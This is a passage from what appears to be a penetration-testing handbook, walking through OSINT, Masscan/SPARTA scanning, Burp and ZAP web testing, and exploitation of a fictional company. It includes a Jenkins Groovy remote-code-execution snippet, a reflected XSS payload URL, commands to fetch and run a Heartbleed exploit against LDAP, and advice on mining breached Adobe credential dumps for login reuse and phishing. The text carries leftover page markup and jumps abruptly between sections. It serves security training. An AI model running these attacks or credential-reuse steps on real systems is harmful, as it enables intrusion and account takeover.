Take a full clean snapshot of your working VMs and let’s start discovering and attacking networks. "},{"pageNumber":48,"pageContent":"Before The Snap - Scanning The Network The game has started and you walk onto the SUCK, Inc. field. Before the first kickoff, and before we even attack our unsuspecting victim, we need to analyze our opponent. Studying the target for weaknesses and understanding the environment will provide huge payoffs. This chapter will take a look at scanning from a slightly different aspect than the normal penetration testing books and should be seen as an additive to your current scanning processes, not as a replacement. Whether you are a seasoned penetration tester or just starting in the game, scanning has probably been discussed over and over again. I am not going to compare in detail all the different network scanners, vulnerability scanners, SNMP scanners and so on, but I will try to give you my most efficient process for scanning. This section will be broken down into Open Source Intelligence, External Scanning, Internal Scanning, and Web Application Scanning. Passive Discovery - Open Source Intelligence (OSINT) Trained in Open Source Intelligence, you use your knowledge of where information exists on the Internet to find as much information about SUCK as we can. We want to become one with these Cyber Kittens, find their secrets, understand their verbiage, and find their employees. Before you ever even start performing any OSINT tests, it is best if you create fake social media accounts. Some examples of these might be (the more you have the better): ● LinkedIn ● Twitter ● Google+ ● Facebook ● Instagram ● MySpace ● Glassdoor You don’t want to use your own personal accounts as many of the sites show who visited your pages. This could be a quick way to get identified and potentially kill your whole mission. Now that we are ready with the OSINT setup, let’s start gathering data. We will start with Passive Discovery, which will search for information about the target, network, clients, and more without ever touching the targeted host. This is great because it uses resources on the Internet without ever alerting the target of any suspicious activity. You can also run all these lookups prior to an engagement to save you an immense amount of time. Let’s start reviewing some sources and tools for OSINT. Recon-NG"},{"pageNumber":49,"pageContent":"( https://bitbucket.org/LaNMaSteR53/recon-ng )(Kali Linux) Recon-NG is a great tool for querying Open Source Intelligence (OSINT) for passive information about a company. This should be one of the first places you start before you pentest any organization. It can give you a lot of information about IP space, naming conventions, locations, users, email addresses, possible password leaks, and more. Recon-ng Prerequisites There are some modules like Linked-In or Jigsaw that provide great value, but you do need to get API keys for those. I will walk you through one API key example, which is free and easy to use. To use the ipinfodb database to find the exact location of all the IPs you identify, you need to get an API key. Go to: http://ipinfodb.com/register.php and register for a key. We will add the key to our local store database during our next example.

This data will become very valuable later, so make sure you review all the data thoroughly. Creating Password Lists: From the OSINT searches, we have learned a great deal about SUCK and their organization. The next step is to find more targeted information about the company, the people, the location, and their customers by developing more customized password lists. We have all used large password lists in the past and specifically in THP1, but we are looking to crack that 70%+ rate. To achieve this, we need to create custom and smart word lists based on our victim companies and related industries. In the last book, we used the crackstation list, which we will definitely use again, but after having a great password base, you need to also build a list of custom passwords. Wordhound ( https://bitbucket.org/mattinfosec/wordhound.git ) (Kali Linux) Wordhound is a tool that creates word lists and dictionaries based on Twitter searches, PDF documents, and even Reddit sub-reddits. So to target our victim company, we can grab all the results from their tweets and even words that might be associated with the company.{1} Wordhound didn’t run right off the bat in Kali Linux at the time of writing this book, so I had to do a few modifications: ● git clone https://bitbucket.org/mattinfosec/wordhound.git /opt/wordhound/ ● apt-get install python-setuptools ● cd /opt/wordhound && python setup.py install && ./setup.sh"},{"pageNumber":57,"pageContent":" I had some issues with tweepy, so i had to manually git clone it and re-download it: ● manually install tweepy ○ pip install -U pip ○ git clone https://github.com/tweepy/tweepy.git /opt/tweepy/ ○ cd /opt/tweepy ○ python ./setup.py install ○ /usr/local/bin/pip install requests[security] ○ service ntp restart Once you get everything working, we need to edit the configuration file: ● cd /opt/wordhound && gedit wordhound.conf.dist ● Input the relevant information such as your twitter API key if you want to use twitter.

Using Compromised Lists To Find Email Addresses And Credentials The great thing about being a penetration tester is that you have to get creative and use all sorts of resources, just as if someone was malicious. One tactic that I have found to be very fruitful in the past is using known credential dumps for password reuse. Let me explain a little more in detail. There was a large breach of Adobe's systems. The compromised information consisted of email addresses, encrypted passwords, and their password hints.{2} The large dump, which was almost 10 Gigabytes, was released privately in small circles and is now publicly available (try searching for Adobe and users.tar.gz). From an attacker's perspective this is a gold mine of information. What I generally do is parse through this file and identify the domains against which I am doing a test. Of course, it is important to see if this type of testing is in the scope of your engagement and that you aren't breaking any laws by obtaining a copy of any password/compromised lists. If it is a full black box test, this should definitely be a part of your attacking approach. For example, in the image below, I will search (using the Linux grep command: grep \"@yahoo.com\" cred > hashlist.txt) through the Adobe password list for a sample domain of yahoo.com and write that"},{"pageNumber":62,"pageContent":"to a file named hashlist.txt (remember you should search for the domain for which you are testing). We can see that there are many users (which I redacted) with an email address containing yahoo that have an encrypted password and password hint. List of Accounts/Passwords from Adobe Breach 2013 Based on the hints, you could do some research and find out who a specific user's boyfriend is or the name of their cat, but I usually go for the quick and dirty attempt. I was able to find two groups of researchers who, based on patterns and hints, were able to reverse some of the encrypted passwords. Remember that from the Adobe list, since the passwords aren't hashes but encrypted passwords, trying to reverse the passwords is much more difficult without the key. The two reversed lists I was able to identify are: ● http://stricture-group.com/files/adobe-top100.txt ● http://web.mit.edu/zyan/Public/adobe_sanitized_passwords_with_bad_hints.txt (no longer available) I combined both these lists, cleaned them, and hosted them on my Github: ● https://github.com/cheetz/adobe_password_checker/blob/master/foundpw.csv"},{"pageNumber":63,"pageContent":" Taking this list, I put together a short python script that parses through a list of email/encrypted passwords and compares that against the foundpw.csv file. Let’s pull this code onto your Kali Linux host: ● git clone https://github.com/cheetz/adobe_password_checker /opt/adobe_password_checker ● cd /opt/adobe_password_checker/ The password_check.py python script will find any password matches between the hashlist.txt file you created and the foundpw.csv file, which contains known passwords. When a match is found, the script will return a list of email addresses and the reversed passwords. Of course, the two research groups do not have a large number of the passwords reversed, but it should contain the low-hanging fruit. Let's see this in action: ● Make sure to copy your hashlist.txt file to /opt/adobe_password_checker/ ● python password_check.py Custom Python Script to Look for Email/Passwords I will usually take the results from this output and try the usernames/passwords against the company's Outlook Web Access (OWA) logins or against VPN logins. You may need to play around with some of the variables on the passwords (i.e. if they have 2012, you might want to try 2015) and also make sure you don't lock out accounts. I then take the email addresses gathered from these findings and use them in spear phishing campaigns. Remember, if they are on the Adobe list, there is a good chance that these users are in the IT group. Owning one of these accounts could be extremely beneficial. This is why penetration testing is so much fun. You really can't just run tools–you have to use your own creativity to give your customer the best and most real-world types of attacks they might receive. Don’t forget to keep checking Pastebin type sites, password dump sites, and Bittorrent files for password leaks.

This allows us to gain a wealth of data without ever triggering a single IDS alert. We should now have enough information about the company, the industry, and possible user passwords. The best part is that we found all this data passively. Let’s move on to scanning and active discovery. External/Internal Active Discovery Active discovery is the process of trying to identify systems, services, and potential vulnerabilities. We are going to target the network ranges specified in scope and scan them. Whether you are scanning from the internal or the external segments of the network, it is important to have the right tools to perform active discovery. I want to emphasize that this book is not going to discuss in detail how to run a scanner, as you should already be familiar with that. If you aren’t, then I recommend that you download the community edition of Nexpose or get a trial version of Nessus. Try running them in a home network or even in a lab network to get an idea of the types of findings, how to use authenticated scans, and the type of traffic generated on a network. These scanners will trigger IDS/IPS alerts on a network very frequently as they are extremely loud. Now that we are ready, let’s get into some of the finer details here. In this section, I describe the process that I like to use when scanning a network. I will use multiple tools, processes, and techniques to try and provide efficient and effective scanning. My scanning processes will look something like this: ● Scanning with Masscan"},{"pageNumber":67,"pageContent":"● Scanning with Sparta ● Scanning with HTTP Screenshot ● Scanning with Eyewitness/WMAP ● Scanning using Nexpose/Nessus/OpenVAS ● Scanning with Burp Proxy Pro ● Scanning with ZAP Proxy ● Parsing Output Masscan ( https://github.com/robertdavidgraham/masscan ) (Kali Linux) Once you start active scanning, there are many tools to use. Historically, we have all used nmap to map out IPs/Ports, but the game has been changing. Large ranges are a pain to scan, but this is where Masscan comes into play. Similar to nmap (it even has similar flags), Masscan uses its own custom TCP/IP stack for speed and efficiency. Let’s see how we would kick off a Masscan scan. Running Masscan: ● cd /opt/masscan/bin/ ● ./masscan -p80,8000-8100 10.0.0.0/8 ● ./masscan -p0-65535 --rate 150000 -oL output.txt ○ -p defines the ports to be scanned ○ --rate defines packets-per-second ■ Be careful with this setting. Make sure your VPS the servers or that the system/network from which you run Masscan can support the amount of traffic ○ -oL defines the list output to write to For example, I ran some test scans from a VPS server: hp2:/opt/masscan/bin$ ./masscan -p0-65535 23.239.151.0/24 --rate 150000 -oL output.txt Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2015-02-02 05:46:10 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 256 hosts [65536 ports/host] hp2:/opt/masscan/bin$ date  Mon Feb 2 05:48:23 UTC 2015 From the test scan above, we are looking at taking about two minutes for the configuration and system on which we are testing.

Masscan improves scanning significantly and allows a tester to scan and have results in minimal time. One feature that really helps you configure your Masscan scans is the use of the --echo switch. The example below writes a sample scan to a file. Reading that file configures all the different settings that the scan will use. Once all the settings are correct, a scan can be kicked off with a “-c” flag. ● hp2:/opt/masscan/bin# ./masscan -p0-65535 23.239.151.0/24 --rate 150000 -oL output.txt --echo > scan.conf ● hp2:/opt/masscan/bin# cat scan.conf rate = 150000.00 randomize-hosts = true seed = 14393045175689752532 shard = 1/1 # ADAPTER SETTINGS adapter-ip = 0.0.0.0 # OUTPUT/REPORTING SETTINGS output-format = list show = open,, output-filename = output.txt rotate = 0 # TARGET SELECTION (IP, PORTS, EXCLUDES) ports = 0-65535 range = 23.239.151.0/24 ... ● hp2:/opt/masscan/bin#./masscan -c scan.conf We can save this template and use it for all future scans or have a list of templates for specific types of scans.

Scanning really large networks works great with Masscan, but for smaller or internal networks, we can use a tool like SPARTA. “SPARTA is a python GUI application which simplifies network infrastructure penetration testing by aiding the penetration tester in the scanning and enumeration phase. It allows the tester to save time by having point-and-click access to his toolkit and by displaying all tool output in a convenient way. If little time is spent setting up commands and tools, more time can be spent focusing on analysing results.”{3} The reason I have found SPARTA to be valuable as part of my toolkit is that it runs NMAP in a staged process. SPARTA will start an initial scan of limited ports, start Nikto for any web ports, and performs screen capture. After the stage 1 scan finishes, it will start a much deeper stage 2 and stage 3 scan of Nmap. Once services are identified, you can easily manually check Nikto, MySQL default credentials, and plug directly into the Hydra password brute-force tool all via the GUI interface. To start up SPARTA: ● cd /opt/sparta/ ● ./sparta.py SPARTA is really simple and straightforward to use. Once you load up the GUI console, click to add hosts and start scanning.

After the reconnaissance phase, you have identified that the Secure Universal Cyber Kittens company has a CIDR /20 range on their externally-facing environment. That comes out to 65536 different IPs that we need to scan and start analyzing. Sure, we kick off our vulnerability scanner in the background, but we need to start attacking, as time is limited. Since there is no way we could visit each and every one of those web pages, we need to automate this process and be able to utilize the resulting data in an efficient manner. This is where we combine both Masscan and HTTP Screenshot to scan the network and take screenshots of the webpages. This way, we can visually look at web pages instead of visiting them one by one. Before starting the scan, we need to configure a few settings: ● cd /opt/httpscreenshot ● edit masshttp.sh to make sure it points to the right masscan executable and make sure that httpscreenshot.py points to the correct location. ○ instead of /root/masscan/bin/masscan, it should be /opt/masscan/bin/masscan ○ instead of ~/tools/httpscreenshot.py, it should be /opt/httpscreenshot/httpscreenshot.py ● change the port to be scanned from 80,443 to 80,443,8000,8001,8080,8443,8008,9200,50070 [add your favorite web ports here] ● create a file called networks.txt to put in the network cidr range you want to scan ○ gedit networks.txt Let’s kick off a scan: ● ./masshttp.sh ● firefox ./clusters.html With the speed of Masscan and the power of HTTP Screenshot, we have a list of websites with the host images. There are a lot of benefits of HTTP Screenshot such as resolving certificate hostnames for virtual/shared hosting and threading, but the biggest benefit is how it correlates similar web pages together. You might have a ton of http basic auth pages or printers and HTTP Screenshot will correlate them together. It makes it much easier for attacking and reporting. I will say that the output isn’t the prettiest, but the functionality is what works. So what are we looking for in web application screenshots? The things that should pop out are: "},{"pageNumber":74,"pageContent":" Why? Because we want shells! A great place to walk through to get a better understanding of vulnerable web applications is to review the exploits themselves. Let’s stop and take a quick look at: http://www.exploit-db.com/webapps/ . From our scan of SUCK, we see normal services like printers (which we will get into a little later), but one thing I now often see on pentests is a couple of Jenkins hosts. This quickly stands out to me and, as stated before, one of the benefits of HTTP Screenshot is that it puts all the Jenkins’ servers together. Jenkins is a web application that provides continuous integration services for software development. Regardless of what it really does, it has some features that can give us our first point into our network. HTTP Screenshot Unauthenticated Jenkins servers are known to have a flaw that allows remote code execution using Groovy Script. Pentestgeek.com did a great article on how to take advantage of this vulnerability, by visiting the Jenkins’ box over port 8080 and traversing to /script/script: ● http://[IP]:8080/script/script Here, we are presented with a script console, where we can execute arbitrary Groovy Script code{4}: ● def sout = new StringBuffer(), serr = new StringBuffer() ● def proc = '[Code to Execute Here]'.execute() ● proc.consumeProcessOutput(sout, serr)"},{"pageNumber":75,"pageContent":"● proc.waitForOrKill(1000) ● println \"out> $sout err> $serr\" This works on both Windows and *nix systems, so just make sure you first find out what system you are attacking. In the example below, we will run a quick “cat /etc/passwd” to make sure that we have code execution. Jenkins Vulnerable Server As you can see in the results, we were able to execute and read our payloads. We won’t dive much more in this section, but this provides a good example of how HTTP Screenshots can be beneficial. One additional thing I want to point out when doing web screenshots is that you will sometimes run into issues where one of the tools does not work or run into certain scenarios where you need more information. I always tell my readers to never focus on one tool, and in this case there are two other tools to look at: Eyewitness - https://www.christophertruncer.com/eyewitness-triage-tool/ ended up really replacing Peepingtom, which was talked about in the first book. Eyewitness works great, but I have had problems on large scans. These might be fixed by now, but this was just one of the many issues I kept running into. One other tool that I would look into is an interesting project called WMAP Network Scanning. The gap they are trying to solve is that these web scrapers don’t generally handle or render Flash or Java.

Vulnerability Scanning: After performing initial scans and mapping out the network, I usually like to kick off a couple of vulnerability scans in the background. I will go over a few tools to help you with vulnerability scanning. Rapid7 Nexpose/Tenable Nessus (Kali/Windows/OS X): Two of the most common vulnerability-scanning tools I see are Rapid7 Nexpose and Tenable Nessus. Like I said in the last book, there is always a huge war about which one of the scanners is better, and again I offer this caveat: I have used most of the commercial scanners and have never found one to be perfect or the right solution. When comparing these tools, I have seen that there are always some findings that are discovered and missed by certain tools. The best idea would be to run multiple tools, but this isn't always the most financially acceptable solution. My quick two cents is that if you are going to purchase a single license, I would recommend getting Tenable's Nessus Vulnerability Scanner. For the number of IPs you can scan and the cost ($1,500), it is the most reasonable. I have found that a single consultant license of NeXpose is double the price and limited on the number of IPs you can scan, but I ask that you verify, as you never know when prices might change. In terms of performance and ease of use, for large complex networks, I prefer the management interface on NeXpose. In terms of finding odd vulnerabilities, Nessus takes the cake on this one. They definitely do a lot of research on embedded devices and SCADA (and the like), where I don’t see those types of findings on my Rapid7 reports. The best option here is to give both of them a trial: ● Rapid7 NeXpose: http://www.rapid7.com/products/nexpose/compare-downloads.jsp ● Tenable Nessus: www.tenable.com/products/nessus/evaluate Openvas ( http://www.openvas.org/)(Kali) Since I do discuss a lot about commercial tools, as I mentioned in previous chapters, I want to be able to complement them with Open Source tools. There is a decent open source vulnerability tool that you can also use in your arsenal. Open Vulnerability Assessment System (OpenVAS) is a great tool for learning and testing vulnerabilities. Compared to the commercial tools, from my experience, OpenVas does pick up a lot of the similar findings, but I have noticed on engagements that it misses potentially high findings. I have also noticed that with OpenVAS, I had a lot of trouble when things"},{"pageNumber":78,"pageContent":"break. When it breaks, it breaks hard and a lot of manual work is needed to get it back up and running. The positive side of OpenVAS is that it does do all the things required by a scanner. It can run different configurations, do authenticated scans, create reports, and even distribute scans over multiple nodes. To get OpenVAS up and running, from a command prompt on your Kali host, type: ● openvas-setup ● openvas-scapdata-sync ● openvas-certdata-sync ● openvas-adduser ● gsd Enter the server address as localhost and the username/password of the account you created during the setup phase.

OpenVAS – Results This vsftpd vulnerability was the one that we found on the Metasploitable 2 box, which we used to exploit with Metasploit in the prior section. "},{"pageNumber":81,"pageContent":"OpenVAS – Findings Vulnerability scanning is still an important factor in any penetration test, though it definitely is not the be-all and end-all for offensive testing. If you look at real world examples, other than external scanning, most attacks do not incorporate a lot of internal scans. This is because they are loud, trigger intrusion detection systems, and, at times, take down services. Instead, they focus on moving quietly through the network, taking knowledge gained from each step to move laterally, and the importance of data exfiltration. Web Application Scanning Scanning the SUCK network, we should now have a good idea of what the infrastructure and running services look like. We have done our research on OSINT tools, created password lists, and we have run our vulnerability scanner. So what’s next? Since most companies these days actually do run vulnerability scanners across their networks, although I still do come across ms08-067, but it is becoming much less frequent. If you do come across an infrastructure that does patch generally well, then web application scanning on a network pentest can be extremely helpful. After I start the network scanners and get a layout with the active discovery tools, I begin my web application scanners. In web scanning, I am going to mainly focus on one tool. There are a lot of good open source/free tools available to use, such as ZAP, WebScarab, Nikto, w3af, etc. In this case, I am going for the quickest, most efficient way to perform a test. Although the Burp Suite Pro (http://portswigger.net/burp/) is a commercial tool, it only costs around $300. This is well worth the cost as it is actively maintained, has a lot of capabilities for manual testing, and many security researchers develop extensions for Burp. Similar to the discussion of vulnerability scanners, this isn't going to be a comprehensive guide to accomplishing web application penetration tests, but more of what is performed during a network penetration test. If you want to focus on testing a single application thoroughly, you are going to want to look into both source code analysis (using something like HP Fortify) and in-depth application"},{"pageNumber":82,"pageContent":"testing (a great resource for this is a book called The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws ). Let's dive into how to efficiently use Burp Suite. The Process For Web Scanning In this section, I describe how I use Burp Suite Pro to scan web applications during a network penetration test. Usually, I won't have enough time during a network pen-test to do a full web application test, but these are the steps I take when I identify larger applications: ● Spider/Discovery/Scanning with Burp Pro ● Scanning with a web application scanner ● Manual parameter injection ● Session token analysis Web Application Scanning After running a tool like Nessus or Nexpose to find the common system/application/service vulnerabilities, it is time to dig into the application. I am going describe how to use Burp Suite and get you to start looking deeper into the application. The following steps will: 1) Configure Your Network Proxy 2) Enable Burp Suite 3) Spider through the application 4) Discover Content 5) Run the Active Scanner 6) Exploit Configuring Your Network Proxy and Browser Remember that the Burp Suite tool works by configuring your web browser to talk through the Burp Suite application and then to the web application(s). This will give you full visibility in the requests made by the browser and also give you the ability to modify the raw requests regardless of client side protections. First, you are going to want to start Burp Suite by running the JAR file on either the Windows or Kali system. Once you have Burp up and running, you want to make sure your proxy is enabled and listening on port 8080. Go to the Proxy tab in Burp, then to Options, and make sure that Burp is running. It doesn't matter which interface port you use, however, if you change it from the default, make sure to change it in your browser's configuration. "},{"pageNumber":83,"pageContent":"Enabling Burp Suite Now, we need to configure your browser so that it can use the port on which we had Burp Proxy listening.

It provides an easy way to have multiple proxies and be able to change between them quickly. Right next to the browser's URL bar, there is a fox with a circle and line across it.

This is the port on which we have configured the Burp Suite application to listen. Burp knows that it will take this traffic and proxy it out to the Internet. Configuring the Browser’s Proxy Settings Since you have saved this profile, right-click on the fox and drop down to select your proxy configuration. In this case, I named my proxy configuration Burp Suite and selected that as my proxy. "},{"pageNumber":85,"pageContent":"Selecting the Proxy to Utilize Once we have our browser using the proxy, we can browse to the web application we identified earlier. In this example, I am going to go to my site in my browser: www.securepla.net. If we go back to Burp, we are going to see the Proxy/Intercept tab light up. Burp Capture and Intercepting Traffic If we see this happen, we know we have configured everything perfectly. We see that Burp successfully captured the GET request for my website and we can also see any cookies and other requested information. By default, the initial state is to intercept all traffic. Intercept means to stop any requests from the browser to the web application, give you the ability to read or modify that request, and either forward that request to the web application or drop that request. If you try to browse to any sites with the default setting, you won't be able to see any responses until you turn off the \"Intercept\" button. By turning the \"Intercept\" button off, we will still be capturing all the web traffic, but we won't be directly tampering with every request. Once in an “Intercept-off” state, you can see all the requests and responses within the History tab to the right of the Intercept. Now, if we go to the Target tab, we can see the URL that we had just trapped and forwarded. Let's first add this site to our Scope. Scope defines where automated spidering and testing could occur and helps prevent you from actively scanning domains that are out of your scope. We will go into this a little bit later, but you should add all the URLs or FQDNs you want to test to your scope. The image below shows the tester right-clicking on the domain and clicking on \"Add to scope.\""},{"pageNumber":86,"pageContent":" Creating Your Scope Spider Application The first thing to do for web application testing is to spider the host. This means that Burp will crawl through the whole website and record all the different files, forms, and HTTP methods on that site. We spider first because we need to identify where all the links are, what types of parameters are used in the application, what external sites the application references to, and the overall layout of how the application functions. To spider your application, drop into the Target tab, the Site map tab, right-click the domain on which you want to spider, and click \"Spider this host.\" Spidering the Host Once the spidering process is complete, Burp should have a good layout of what the application looks like. We can also click on any file (image below) to see what the request and the response were. In the left-hand column, we see all of the files and folders, and on the right-hand side, we see the requests and responses. Right below the Site map tab is the Filter button. Try playing around with this to see what you are filtering out and what works for you. Generally, I like to first add all my domains to scope and then click the Filter to only show those that are in scope. It ends up cleaning up a lot of referenced domains, which are out of scope on my tests anyway. "},{"pageNumber":87,"pageContent":"Site Map/Request and Responses Discover Content There are times where pages or folders are not directly linked from a web application. For example, I have often seen that the admin folder or login page are not referenced anywhere on the site. You might see that when you go to the /admin/ folder in your browser bar, you are taken to the admin authentication page, but this might have been missed during the spidering phase. This is usually because host administrators are trying to hide these folders and administrative login pages from general users. These are the exact types of things you are looking for in a test, so that you can try to bypass or brute-force the authentication process. There is a specific module within Burp that is extremely helpful in these scenarios. Within the same Site map tab, you right-click on the parent URL, drop down to \"Engagement tools,\" and click on \"Discover content.\" "},{"pageNumber":88,"pageContent":"Discover Content Once inside the Discovery module, you can click on the \"Session is not running\" button and the application will start \"smart brute forcing\" folders and file structures. When I say, \"smart brute forcing,\" I mean the application learns from files and folders it finds within the application and tries to make better choices for brute forcing. This technique provides an efficient process to identify folders and files to further your application testing. Before I show the example, note that there are custom wordlists that I prefer to use during my own assessments. One of these lists comes from a tool called RAFT that is no longer developed. These lists can be found here: http://code.google.com/p/raft/source/browse/trunk/data/wordlists/? r=64 "},{"pageNumber":89,"pageContent":"Discovering Session Status As you can see in the image above, the Discovery tool identified the /wp-includes/ folder which is common to WordPress applications. It then starts looking for common folder/files types within that folder. You can click on the Site map tab at the top of the Discovery module and see all the results from that scan. This will help to quickly identify hidden folders, admin pages, configuration pages, and other pages that will prove useful to a tester. Running the Active Scanner Once you feel comfortable that you have identified an adequate portion of the site, you can start attacking the parameters, requests, and start looking for vulnerabilities. This can be done by right- clicking on the parent domain and dropping down to \"Actively scan this host\" (image below). This will kick off Burp's application scanner and start fuzzing input parameters. Remember, this is going to be extremely loud on the network and may submit extensive queries in the application. A quick warning, if the application has a comment box, the customer might receive an excessive amount of emails from all the parameters being actively fuzzed. This is why it is always important to let your customer know when and from where the tester will be performing these tasks. "},{"pageNumber":90,"pageContent":"Active Vulnerability Scans Once the scanner is running, the results and testing queue will be located in the \"Scanner\" tab. You might want to look at the Options tab within the Scanner tab to further configure Burp Suite. One change that I generally make to decrease scan times is to increase the number of threads in the Active Scan Engine section. This will make a significant difference in the amount of time that is required, but be careful, as you might take down a small site if the thread count is too high. If we take a look at the results, we see that Burp Suite found an XSS vulnerability for this website. Burp told us exactly what the issue was, the request to repeat it, and the response. "},{"pageNumber":91,"pageContent":"Scan Results Being a penetration tester, you need to verify that you do not have any false positives and identify the actual severity of the finding.

To replicate this issue, we would have to go and visit: www.securepla.net/xss_example/example.php?alert=9228a<script>alert(1)</script>281717daa8d . Opening a browser and entering the URL, the following demonstrates that this is not a false positive, but a real vulnerability.

OWASP Zap Proxy ( https://code.google.com/p/zaproxy/ )(Kali Linux/Windows/OS X) The equivalent to Burp Pro Proxy on the open source side is called OWASP Zed Attack Proxy or ZAP. Although Burp is a commercial tool, ZAP has many of the same features. From proxying traffic, fuzzing requests, spidering and automated scanning, ZAP does it all. In Windows/OS X, you can just double-click on the OWASP ZAP executable and you can run it on Kali with owasp-zap. We are going to test against one of the vulnerable frameworks on OWASPBWA (which we installed in the setup phase of the book). In this case we will be testing against the owaspbricks application.

We can instantly identify that our scanners have much different results.

The next phase of your mission is to take everything that you have gathered and learned to identify weaknesses and exploit them for fun and profit. As with the first THP book, The Drive section takes results from the prior phases and exploits them for an initial foothold into the company. Some findings might have exploits available through the Metasploit framework, some you might have to find on exploit forums, and some just take experience and knowledge to take advantage of misconfigurations. Using you use Nexpose or Nessus (or any other vulnerability scanner), might not make a difference for the exploiting process. Once a scanner finds a vulnerability, I will usually go and search for a working exploit. I have dedicated a section in the later chapters about Vulnerability Searching and how to find exploits based on findings from a scanner, but for now, I will briefly describe how to use Metasploit, the importance of understanding scripts to exploit your vulnerabilities, and common vulnerability misconfigurations. Metasploit ( http://www.metasploit.com ) (Windows/Kali Linux) Before we can get into exploiting scanner findings, we need to quickly go over Metasploit again. The Metasploit Framework is designed for developing, exploiting, and assisting in attacks. The best part of the framework is that it was developed with research in mind. By this, I mean that it is very easy to develop your own Metasploit modules and utilize them within the framework. It doesn’t take a lot of Ruby knowledge, but it requires only basic scripting skills. Without spending too much time explaining Metasploit, let’s walk through an example using the framework. Remember that this book is geared to those that have some Metasploit experience. If you are pretty new to Metasploit, you should spend a fair chunk of time learning the basics of this tool. Here are a few helpful tips before we start with Metasploit. You should refer back to these tips while you are using Metasploit during your first few times; after that you should be good on your own.

A lot of the time, the scripts/codes will be written in Python, C++, Ruby, Perl, Bash, or some other type of scripting language. Note that as a penetration tester, you need to be familiar with how to edit, modify, execute, and understand the scripts/codes regardless of the language and be able to understand why an exploit works. I don't recommend you ever execute a script without testing it first. I have honestly seen a few scripts on forums and Exploit-DB where the shellcode payload actually causes harm to the intended system. After the script exploits the vulnerability, the payload deletes everything on the vulnerable host. I am pretty sure that your client would not be too happy if everything on his host system was wiped clean. This is why you should always either use your own shellcode or validate the shellcode that is within the script. WarFTP Example Let's say you find a vulnerable version of WarFTP server running and you find some code (for example: http://downloads.securityfocus.com/vulnerabilities/exploits/22944.py) on the Internet. Things you may need to understand: ● How do you run the exploit? What language is it? Do you need to compile it or are there any libraries you need to import? ● Are there any dependencies required for the exploit to work? Version of Windows or Linux? DEP or ASLR? ● Are the EIP addresses or any other registers or padding values hardcoded to specific versions? Do they need to be modified? ● Will the exploit take down the service? Do you only have one chance at compromising the host? This is very important as you might need to work with the client or test a similar infrastructure environment. Here is an example of what your script could look like and, if run properly, could allow shell access on the victim server. "},{"pageNumber":104,"pageContent":"Example Exploit"},{"pageNumber":105,"pageContent":" Even with MS08-067, the exploit is Operating System and service pack dependent. Luckily with that payload, it tries to identify the proper OS before exploiting the host. A lot of the exploits that are written in scripting languages do not take these into account and are developed for a single OS type. This is why you will often see that the exploit will contain information about the system on which it was tested. Even within the same Operating System, something like the Language of the OS can cause an exploit to fail or cause a denial of service. For example, the following PCMAN FTP buffer overflow exploit was only tested on the French version of Windows 7 SP1. This does not guarantee that this exploit will be successful on the English version. FTP Exploit Example Script This is why I recommend you understand and test all of your exploits before you try them on any production host and make modifications to scripts as necessary. Printers It often happens that we overlook low-level findings, but there are many times where we can go from low to owning the network. One of my favorite examples is with printers. We all come across a ton of"},{"pageNumber":106,"pageContent":"multi-function printers (MFP) on our engagements and, in the past, have overlooked them. What if these MFP devices could lead to a compromise on the network? You jump on a network and currently don’t have any credentials. You might want to start small and scan only your current subnet in hopes as not to alert any IDS sensors. In doing so, you come across a multi-function printer. Maybe your scanner picks up default credentials or you guess the password from reading documentation.{5} Moreover, perhaps you come across an unpatched printer and use an exploit in your printer exploitation folder–check out the /opt/praedasploit ( https://github.com/MooseDojo/praedasploit ) folder. Once in the administrative console, you poke around and nothing really of value is there, or is there? You notice that these enterprise multi-function printers have the capability to query the domain to find email addresses via LDAP. This means when you are physically on the printer using the little LCD screen, when scanning a document, you have to internally find the sender’s email address based on their name. What if you could pull the password from the user account that it used to bind to the LDAP server to run the queries?{6} We first log into our Xerox MFP with the default credentials over HTTP. Like I said before, I am sure we see this pretty much on every penetration test.

Heartbleed Heartbleed is one of those buzzword security vulnerabilities that blew up in 2014. Unfortunately for network administrators and system owners, this vulnerability was one of the worst issues of that year. The Heartbleed bug was a vulnerability in OpenSSL that allowed an attacker to read parts of the server’s memory. So what does this really mean? You can ask a server that uses SSL security for encryption to perform a request and, in addition, give you some allocated chunk of memory back. For an easier visual reference, visit this xkcd article: http://xkcd.com/1354/ . From the xkcd comic strip, you ask for a word to be returned (example: dog), but ask for the size to be returned as 500 bytes instead of the normal 3 bytes. The server will return the word “dog” back to you, and in the process, you will also receive any other memory that might have been allocated in previous requests. We don’t know exactly how many systems were vulnerable, but zmap.io did a scan of the Alexa Top 1 Million domains as of April 16, 2014 and reported which domains were vulnerable at the time. Supposedly, reports have stated that even today some of the domains are vulnerable. See https://zmap.io/heartbleed/vulnerable.html ."},{"pageNumber":111,"pageContent":" The scary part was what was found in the memory space. From numerous penetration tests, we found passwords, usernames, random strings, emails, session keys, and even private SSL certificates. With private SSL certificates, we can now decrypt any traffic that we sniff. So let’s walk through one example. Although there are numerous tools (a Metasploit module is available) to pull memory from vulnerable OpenSSL services, we are going to compile our own: ● cd /opt/ ● wget https://raw.githubusercontent.com/HackerFantastic/Public/master/exploits/heartbleed.c ● gcc heartbleed.c -o heartbleed -Wl,-Bstatic -lssl -Wl,-Bdynamic -lssl3 -lcrypto ● chmod +x heartbleed We should have a heartbleed binary to execute against a vulnerable service. The most common way to exploit heartbleed was via HTTPS, but it is not the only way. One more interesting example that I have seen in multiple environments is from OpenLDAP using OpenSSL. We all know that LDAP is the authentication and authorization source for many different companies and being able to pull out sensitive data could be detrimental. From our vulnerability scanner output, we see that 192.168.100.101 is vulnerable to Heartbleed. Let’s take the binary we just compiled and execute it against that host: ● ./heartbleed -s [IP] -p [port] -f [output file] -v [verbose] -t [type] ● example below: ./heartbleed -s 192.168.100.101 -p 636 -f output_ldap -v -t 1 Heartbleed check What might we see in the output_ldap file? If you look closely, we see a SSHA {SSHA} hash. We could take that into oclHashcat and crack it. In the same dump, we could have also seen user accounts, organizational structure, and private SSL certificates as well. We could have made a copy of the private SSL certificate and sniffed all the traffic to that LDAP server. This could mean that we would have every user’s account that authenticated against this LDAP server."},{"pageNumber":112,"pageContent":" Heartbleed - LDAP Memory Disclosure Now, we know there are tons of different Web and LDAP servers that were vulnerable, but these aren’t the only juicy sources of Heartbleed data. One of the largest issues and attacks seen with Heartbleed was that it affected SSL VPNs. Imagine for a second that you could read the server’s memory on a VPN server. What would be the impact if you could see username and passwords? In theory, you would have direct access as any user that was logged in at that time. What if the 